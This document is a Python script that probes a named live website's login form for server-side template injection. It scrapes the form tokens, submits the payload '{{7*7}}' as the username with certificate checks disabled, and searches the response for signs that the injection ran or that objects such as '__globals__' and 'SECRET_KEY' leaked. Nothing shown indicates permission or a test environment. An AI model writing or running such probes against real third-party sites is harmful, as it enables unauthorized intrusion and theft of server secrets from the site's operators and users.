#!/usr/bin/env python3
import requests, re, sys
import urllib3
urllib3.disable_warnings()

BASE = "https://www.drfrost.org"

def test_ssti(payload, output_file="/tmp/ssti_test.txt"):
    with open(output_file, "w") as f:
        f.write(f"=== Testing payload: {payload} ===\n")
        
        # Step 1: Get login page and extract key
        try:
            r = requests.get(f"{BASE}/login?index", timeout=15, verify=False)
        except Exception as e:
            f.write(f"GET failed: {e}\n")
            return
        
        # Extract idempotencyKey
        match = re.search(r'name="idempotencyKey"[^>]*value="([^"]+)"', r.text)
        if not match:
            f.write("Could not find idempotencyKey\n")
            f.write(f"Response snippet: {r.text[:2000]}\n")
            return
        key = match.group(1)
        f.write(f"idempotencyKey: {key}\n")
        
        # Extract authenticity_token if any (look for it too)
        auth_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', r.text)
        if auth_match:
            f.write(f"authenticity_token: {auth_match.group(1)}\n")
        
        # Also check for csrf
        csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text)
        if csrf_match:
            f.write(f"csrf_token: {csrf_match.group(1)}\n")
        
        # Step 2: POST with payload
        data = {
            "username": payload,
            "password": "dummypass",
            "idempotencyKey": key
        }
        f.write(f"POST data: {data}\n")
        
        try:
            r2 = requests.post(f"{BASE}/login", data=data, allow_redirects=False, timeout=30, verify=False)
        except Exception as e:
            f.write(f"POST failed: {e}\n")
            return
        
        f.write(f"Status: {r2.status_code}\n")
        f.write(f"Location: {r2.headers.get('Location', 'N/A')}\n")
        f.write(f"Cookies: {dict(r2.cookies)}\n")
        f.write(f"Response length: {len(r2.text)}\n")
        
        # Check for SSTI indicators
        if "49" in r2.text:
            f.write("*** SSTI CONFIRMED: '49' found in response ***\n")
        if "7777777" in r2.text:
            f.write("*** SSTI CONFIRMED: '7777777' found in response ***\n")
        if "__class__" in r2.text or "__globals__" in r2.text or "SECRET_KEY" in r2.text:
            f.write("*** Config/code leak detected ***\n")
        
        # Write first 2000 chars of response for analysis
        f.write("\n--- RESPONSE (first 2000 chars) ---\n")
        f.write(r2.text[:2000])
        f.write("\n--- END ---\n")
        
        # Write last 2000 chars
        f.write("\n--- RESPONSE (last 2000 chars) ---\n")
        f.write(r2.text[-2000:])
        f.write("\n--- END ---\n")
        
        f.write("Test complete.\n")

if __name__ == "__main__":
    test_ssti("{{7*7}}")